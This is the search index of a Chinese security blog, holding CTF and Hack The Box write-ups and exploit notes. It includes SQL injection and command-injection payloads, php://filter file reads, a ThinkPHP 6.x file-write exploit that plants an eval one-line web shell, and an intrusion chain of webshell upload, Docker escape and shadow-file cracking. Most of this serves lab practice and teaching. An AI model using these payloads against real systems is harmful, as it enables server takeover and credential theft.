<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CTP笔记</title>
    <link href="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/05/05/CTF%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<ol><li><p>EasySQL,第一反应就是sql注入，别问为啥，问就是因为我流批直接后面丢sql注释就完了</p><img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/01.png"></li><li><p>随便注，第一反应还是sql注入，直接丢个</p><p><code>1;show databases</code></p><img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/02.png"><p>emmm好使了，那就接着读表吧</p><img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/03.png"><p>表出来就直接读字段就完了</p><p><code>1-1&#39;;show columns from 1919810931114514#</code></p><img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/04.png"><p>后台有正则验证，直接大小写加拼接绕过即可</p><p><code> -1&#39;;Set @sql = CONCAT(&#39;se&#39;,&#39;lect * from 1919810931114514;&#39;);Prepare stmt from @sql;EXECUTE stmt;#</code></p><img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/05.png"></li><li><p>Havefun进来就看着个这玩意</p><img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/06.png"><p>这时候必备的前端技能来了，直接右键检查，看到flag字段没</p><img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/07.png"><p>直接构造payload：</p><p><code> /?cat=dog</code></p><p>flag就出来了，简简单单</p><img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/08.gif"></li><li><p>EasySQL不多墨迹，调整mysql 的sql_mode，payload：</p><p><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p><img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/09.png"></li><li><p>Include,直接点tips，看到url这不就是文件包含，flag.php，那就想办法把源码读出来就完了呗</p> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/10.png"><p> payload:</p><p> <code> ?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p> 读出来的东西直接base64解码就完了</p></li><li><p>Secret File,一进来，卧槽，这什么玩意？？？</p> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/11.png"><p> 想了想，继续我的f12大法，嗯哼，发现了一个文件，小老弟，我可是做过前端开发的 </p><p> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/12.png"> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/013.png"> </p><p> 点一下，一闪而过，嘿，你还没头了，burp直接抓包，一点不带惯着的</p> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/14.png"> <p> 又让我逮到了吧，访问他就完了呗，结果又给我整出来代码了，真想抽出我四十米的大砍刀，算了，出题的表哥我应该打不过</p> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/15.png"><p> 直接访问flag.php</p> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/16.png"><p> 。。。。。。。。。。。。。。。。。。。。。你到底要干啥</p><p> 继续我的文件包含大业吧，构造payload：</p><p> <code> ?file=php://filter/read=convert.base64-encode/resource=./flag.php</code></p> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/17.png"><p> 。。。。竟然还需要加解密，那就解他就完了呗，一看就是base64，解出来就是这样的：</p><pre><code> &lt;html&gt; &lt;head&gt;     &lt;meta charset=&quot;utf-8&quot;&gt;     &lt;title&gt;FLAG&lt;/title&gt; &lt;/head&gt;  &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;          &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;          &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;         &lt;?php             echo &quot;我就在这里&quot;;             $flag = &#39;flag&#123;dfab7fd3-545b-4085-bf90-7ea08d2423e6&#125;&#39;;             $secret = &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;         ?&gt;     &lt;/p&gt; &lt;/body&gt;</code></pre> <p> flag清清楚楚的就摆在那，搞定</p></li><li><p>一打开就是下面这个样子，这个我不是做过吗，这么简单</p> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/018.png"><p> Login Success! ？？？？不是成功了嘛。。。。</p> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/019.png"><p> 那就想办法爆库爆表爆字段吧：    </p><pre><code> #查列数 admin&#39; order by 1#  #查回显位 -1&#39; union select 1,2,3#  #查库 -1&#39; union select 1,2,database()#  #查表 -1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = &#39;geek&#39;#  #查字段 -1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#39;l0ve1ysq1&#39;#  #查flag -1&#39; union select 1,2,group_concat(password) from  l0ve1ysq1#</code></pre></li><li><p>EXEC,明显的命令执行，带个ls试试：</p> <img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/20.png"><p> 接下来就翻就完了</p><p> <code> 127.0.0.1;cat ../../../flag</code></p></li></ol><p>就先写这些吧，一点难度都没有，莫得意思（开玩笑的，别打我）</p><img src="/2021/05/05/CTF%E7%AC%94%E8%AE%B0/21.png">]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>实战web打点到内网漫游</title>
    <link href="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/"/>
    <url>/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/</url>
    
    <content type="html"><![CDATA[<p>首先扫描主机：<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/01.png"></p><p>开启的端口有2001和22，22先扔那，没有办法再日他，访问2001地址，是一个web：<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/02.png"></p><p>发现.acition后缀，第一反应struct2，掏出我的小学生工具：<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/03.png"></p><p>嗯。。。有洞，上传我的冰蝎马：<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/04.png"></p><p>连接后发现根目录下的.dockerenv文件<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/05.png"></p><p>哎嘿，小老弟，在docker里面，常规的docker逃逸我就知道那几个，脏牛，cve-2019-5736，磁盘挂载，那个cve-2019-5736动静有点大而且要求比较多，还是掏出我得小学生工具cdk，尝试磁盘挂载，执行命令：./cdk run mount-disk，成功<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/06.png"></p><p>进入temp目录找到挂载的磁盘：<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/07.png"></p><p>下载shadow以及passwd到本地，执行：unshadow  passwd shadow &gt;  test_passwd，合并为一个文件：<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/08.png"></p><p>掏出我的小学生工具，john日他（不日我的新电脑岂不是白买了）<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/09.png"></p><p>日出来，用户名：ubuntu 密码：ubuntu，掏出我的putty连他<br><img src="/2021/03/20/%E5%AE%9E%E6%88%98web%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/10.png"><br>嗯。。。今天有点晚，就先搞到这吧，下一篇文章继续</p>]]></content>
    
    
    <categories>
      
      <category>主机</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTB Passage教程</title>
    <link href="/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/"/>
    <url>/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>打开界面如图：<br><img src="/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/01.png"></p><p>看了下最底部有CMS ：CuteNews<br>注册个用户：<br><img src="/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/02.png"></p><p>最下方有版本号：2.1.2,直接百度CuteNews 2.1.2复现，查到有相关漏洞，直接下载poc（poc在最下方），放到MSF中，MSF加载脚本（不会的自己百度）：<br><img src="/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/03.png"></p><p>设置相应参数，成功得到meterpreter会话：<br><img src="/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/04.png"></p><p>poc:<br><a href="/download/46698.rb">点击下载</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTB Can you encrypt fast enough?</title>
    <link href="/2021/03/05/HTB-Can-you-encrypt-fast-enough/"/>
    <url>/2021/03/05/HTB-Can-you-encrypt-fast-enough/</url>
    
    <content type="html"><![CDATA[<p>打开界面后如下图：<br><img src="/2021/03/05/HTB-Can-you-encrypt-fast-enough/01.png"><br>尝试MD5加密后填进输入框后提示 “Too slow!”<br><img src="/2021/03/05/HTB-Can-you-encrypt-fast-enough/02.png"><br>查看源码后推测，应该是用程序发包，构造如下Python代码：</p><pre><code class="hljs stylus">import requestsimport hashlibimport reurl=<span class="hljs-string">&quot;http://139.59.176.149:30207/&quot;</span>r=requests<span class="hljs-selector-class">.session</span>()out=r<span class="hljs-selector-class">.get</span>(url)rr = re<span class="hljs-selector-class">.compile</span>(r<span class="hljs-string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;(\S+)&lt;/h3&gt;&quot;</span>, re.I)str1 = rr<span class="hljs-selector-class">.findall</span>(out.text)str2=hashlib<span class="hljs-selector-class">.md5</span>(str1<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<span class="hljs-selector-class">.hexdigest</span>()data=&#123;<span class="hljs-string">&#x27;hash&#x27;</span>: str2&#125;out = r<span class="hljs-selector-class">.post</span>(url = url, data = data)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(out.text)</span></span></code></pre><p>成功回复flag<br><img src="/2021/03/05/HTB-Can-you-encrypt-fast-enough/03.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-0787提权</title>
    <link href="/2020/11/21/CVE-2020-0787%E6%8F%90%E6%9D%83/"/>
    <url>/2020/11/21/CVE-2020-0787%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<p>1.低权限用户登录后执行poc<br><img src="/2020/11/21/CVE-2020-0787%E6%8F%90%E6%9D%83/01.png"></p><p>2.返回管理员权限cmd<br><img src="/2020/11/21/CVE-2020-0787%E6%8F%90%E6%9D%83/02.png"></p><p>poc：<br><a href="/download/poc.exe">点击下载</a></p>]]></content>
    
    
    <categories>
      
      <category>主机</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp6.x任意文件写入漏洞</title>
    <link href="/2020/11/20/thinkphp6-x%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2020/11/20/thinkphp6-x%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<ol><li><p>在cookies中构造长度为32位的PHPSESSID:如/../../../public/0000000000x.php</p><img src="/2020/11/20/thinkphp6-x%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/1605886532449.png"></li><li><p>访问index/vuln?param=<?php phpinfo();?><br> param后的参数即为你要输入的payload</p></li><li><p>访问后会在 web 根目录生成 0000000000x.php （如果有写入权限的话）</p></li><li><p>写入一句话：将param后的参数替换为一句话 <?php @eval($_POST[pp]);?></p></li><li><p>蚁剑连接：</p><img src="/2020/11/20/thinkphp6-x%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/1605886884765.png"></li><li><p>成功getshell：</p><img src="/2020/11/20/thinkphp6-x%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/1605887022637.png"></li></ol>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
